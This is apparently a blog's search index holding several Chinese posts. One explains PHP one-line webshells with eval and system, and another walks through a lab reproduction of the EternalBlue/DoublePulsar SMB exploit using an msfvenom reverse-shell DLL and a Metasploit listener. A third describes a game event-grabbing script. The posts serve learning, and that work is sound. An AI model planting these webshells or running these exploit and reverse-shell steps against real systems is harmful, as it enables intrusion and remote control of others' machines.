<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2018%2F07%2F18%2Fcenter%20%E9%87%8D%E6%9E%84%E8%8F%9C%E5%88%80%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95center%2F</url>
    <content type="text"><![CDATA[自写菜刀之路——PHP一句话木马的实现原理与利用方法最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&lt;?php @eval($_GET["code"])?&gt;&lt;?php @system($_POST["cmd"])?&gt; 那么用eval和system有什么区别呢？在这里大概说一说，应为对这类脚本语言都不熟悉，就只能说说自己了解的。 eval()是把其中的参数按照PHP代码来解析，因此eval()函数后跟的都必须是合法的PHP代码，切必须以分号结尾。 使用eval()函数的一句话实现菜刀的功能： code参数后边直接跟PHP代码就可以执行了，记得以分号结尾。 1shell1.php?code=phpinfo(); 再说system()函数，PHP中system()函数的参数是直接跟具体命令而不是PHP代码。举个例子： 1&lt;?php @system($_GET["code"])?&gt; 对于这样的一句话，通过GET方法提交参数后的效果如下图： 可以看到，code参数直接赋值具体命令就可以完成命令执行了。总结一下就是eval()函数是代码执行，system()函数是命令执行。 当然现在直接使用这两个函数的一句话基本看不到了，毕竟特征太明显了，大部分情况下都会被拦截。但高深的一句话用法以后再讨论了，当下还是要先写菜刀。。。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[易语言实现天刀兑换活动Q币]]></title>
    <url>%2F2018%2F07%2F05%2F%E6%98%93%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%A4%A9%E5%88%80%E5%85%91%E6%8D%A2%E6%B4%BB%E5%8A%A8Q%E5%B8%81%2F</url>
    <content type="text"><![CDATA[最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0- 一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。附上源代码。 点击下载]]></content>
      <categories>
        <category>编程日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu DOS界面使用中文输入法]]></title>
    <url>%2F2018%2F07%2F04%2FUbuntu%20DOS%E7%95%8C%E9%9D%A2%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在ubuntu非图形界面下输入中文的方法： 1、安装一个输入法，以搜狗输入法为例。在终端下操作： 1sudo apt-get install fcitx im-switch fbterm fcitx-frontend-fbterm 2、以前的版本在安装完成后需要配置用户目录下的.fbtermrc文件，现在不需要了。安装完成后直接通过ctrl+space即可切换成中文输入法。如果切换无效，可以输入fcitx回车，完成后就可以通过ctrl+space切换中文输入了。]]></content>
      <categories>
        <category>玩转Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[方程式SMB漏洞复现]]></title>
    <url>%2F2018%2F07%2F04%2F%E6%96%B9%E7%A8%8B%E5%BC%8FSMB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[利用条件，目标系统window10以下，开启了文件共享。实验环境如下： 1、 攻击机，windows10，64位，IP地址 192.168.46.1 2、 监听机，ubuntu，64位，IP地址 192.168.46.139 3、 靶机，win7sp3，32位，IP 192.168.46.129 在复现之前首先要对fb.py文件进行一些修改，将27，28，29，72行代码注释掉。 首先在攻击机上运行fb.py脚本。 Target IP输入靶机IP，Callback IP 输入攻击机得IP，Use Redirection选择no。 之后选择新创建项目，自己输入项目名，下一个直接默认回车。 选择Eternalblue模块，之后一路默认回车直到让选择目标系统和位数时自己根据情况选择，然后继续默认回车。 输入 use Doublepulsar 使用 Doublepulsar插件，之后一路回车到选择项。 选择SMB后门，位数根据靶机自己选择，操作选择rundll。 到这里面我们可以暂时不管攻击机了，转向监听机。首先用ubuntu生成一个恶意得dll文件。具体命令为： 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=5555 -f dll &gt; /home/ryweer/1.dll IP是监听机得IP，端口自己设置。生成之后将1.dll文件导出到攻击机处。在打开msf加载exploit/multi/handler。 设置监听ip位监听机ip，监听端口为dll设置得端口，指令为： 123set lhost 192.168.46.139set lport 5555exploit 监听机已经开始监听，这是我们再返回攻击机，设置dll路径为之前导出得dll路径，之后一路回车。 执行插件是却发现失败了。 这个问题在我复现过程中困扰了很久。DLL Architecture is: 64 bit ，看报错似乎是dll是64位的问题，仔细想靶机为32位，那就是我们在生成dll过程中出现了问题，返回查看发现应该在生成dll时吧x64去掉，换成如下命令再次重复一次。 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=2222 -f dll &gt; /home/ryweer/2.dll 监听机已成功检测到一个shell，复现成功。但是靶机已经检测到，自动重启了系统。估计是系统版本太高，后又在xp系统上测试成功。看来win10以下通杀也只是理论上的。 这里需要注意的是如果靶机位64位系统的话，在使用msf时要加一句 1set PAYLOAD windows/x64/meterpreter/reverse_tcp 32位的系统不用。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
